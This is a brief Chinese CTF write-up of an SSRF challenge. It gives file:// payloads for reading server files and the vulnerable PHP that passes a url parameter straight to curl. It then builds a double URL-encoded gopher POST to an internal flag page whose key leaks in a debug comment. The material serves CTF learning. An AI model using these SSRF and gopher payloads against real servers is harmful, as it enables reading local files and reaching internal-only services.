# POST请求

```shell
?url= file:///var/www/html/index.php
?url= file:///var/www/html/flag.php

```

```html
#index.php 内容

<?php

error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```

```
# flag.php 内容
<?php
error_reporting(0);
if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}
$flag=getenv("CTFHUB");
$key = md5($flag);

if (isset($_POST["key"]) && $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?>
<form action="/flag.php" method="post">
<input type="text" name="key">
<!-- Debug: key=<?php echo $key;?>-->
</form>
```



> 构造 goper

```
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

 key=f730028c17453360fa44e99b3d7523ec
```

```
POST%2520%252Fflag.php%2520HTTP%252F1.1
Host%253A%2520127.0.0.1%253A80
Content-Length%253A%252036
Content-Type%253A%2520application%252Fx-www-form-urlencoded
%2520key%253Df730028c17453360fa44e99b3d7523ec
```

